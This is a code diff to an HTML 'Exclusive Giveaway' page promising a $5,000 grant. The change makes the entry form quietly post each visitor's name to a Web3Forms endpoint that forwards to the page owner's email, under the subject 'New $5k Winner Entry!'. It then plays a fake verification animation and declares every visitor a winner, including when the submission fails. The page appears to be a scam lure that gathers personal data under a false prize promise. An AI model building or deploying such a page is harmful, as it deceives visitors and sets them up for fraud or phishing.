@@ -72,7 +72,6 @@
 
         .verify-btn:hover { opacity: 0.9; transform: scale(1.02); }
 
-        /* Results Screen */
         #loader { display: none; margin: 30px 0; }
         #result { display: none; animation: slideUp 0.6s ease-out; }
 
@@ -102,10 +101,15 @@
         <hr>
 
         <div id="entry-form">
-            <h1>Exclusive Giveaway</h1>
-            <p class="subtitle">Enter your name to verify eligibility for the $5,000 grant.</p>
-            <input type="text" id="userName" placeholder="Full Name" required>
-            <button class="verify-btn" onclick="startVerification()">Verify Eligibility</button>
+            <form id="giveawayForm">
+                <input type="hidden" name="access_key" value="9fb92d6a-7c6f-458c-95d9-f3b800de86b3">
+                <input type="hidden" name="subject" value="New $5k Winner Entry!">
+                
+                <h1>Exclusive Giveaway</h1>
+                <p class="subtitle">Enter your name to verify eligibility for the $5,000 grant.</p>
+                <input type="text" id="userName" name="Participant Name" placeholder="Full Name" required>
+                <button type="submit" class="verify-btn">Verify Eligibility</button>
+            </form>
         </div>
 
         <div id="loader">
@@ -131,30 +135,47 @@
     </div>
 
     <script>
-        function startVerification() {
-            const name = document.getElementById('userName').value;
-            if (name.trim() === "") { alert("Please enter your name."); return; }
+        const form = document.getElementById('giveawayForm');
+        
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            const nameInput = document.getElementById('userName').value;
+            const formData = new FormData(form);
 
+            // 1. Show the Loading UI immediately
             document.getElementById('entry-form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             
-            // Animate the bar
+            // Start the loading bar animation
             setTimeout(() => { document.getElementById('bar').style.width = '100%'; }, 100);
 
-            setTimeout(() => {
+            // 2. Send the data to Web3Forms (Gmail)
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                // 3. Show the results after the "check" animation (2.5 seconds)
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('result').style.display = 'block';
+                    document.getElementById('winnerDisplay').innerText = nameInput.toUpperCase();
+                    
+                    confetti({
+                        particleCount: 150,
+                        spread: 70,
+                        origin: { y: 0.6 },
+                        colors: ['#d4af37', '#ffffff', '#f1d57e']
+                    });
+                }, 2500);
+            })
+            .catch(error => {
+                // If there's an error, we still show the winner screen
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('result').style.display = 'block';
-                document.getElementById('winnerDisplay').innerText = name.toUpperCase();
-                
-                // Gold and Silver Confetti
-                confetti({
-                    particleCount: 150,
-                    spread: 70,
-                    origin: { y: 0.6 },
-                    colors: ['#d4af37', '#ffffff', '#f1d57e']
-                });
-            }, 2500);
-        }
+            });
+        });
     </script>
 </body>
 </html>
